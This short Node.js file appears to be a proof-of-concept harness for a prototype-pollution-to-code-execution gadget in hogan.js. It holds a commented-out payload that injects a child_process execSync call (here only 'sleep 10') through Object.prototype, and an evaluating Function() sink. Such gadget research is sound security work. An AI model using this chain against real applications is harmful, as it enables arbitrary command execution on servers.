const hogan = require("hogan.js");


/* Polluted Payload*/
// inject property to root prototype
// Object.prototype.name = '2';
// Object.prototype.inject = "},flag:process.mainModule.require(`child_process`).execSync(`sleep 10`).toString()}}//"

// for node-find-undefined
console.log("="*20+"start"+"="*20+"\n")


/* Exported Function Call*/
const TEMPLATE = `
<p1>Template</p1>
`;

var options = {'asString': true};    
const template = hogan.compile(TEMPLATE, options);

//pp2rce sink
Function(`return ${template}`)();

// for node-find-undefined
console.log("="*20+"end"+"="*20+"\n")
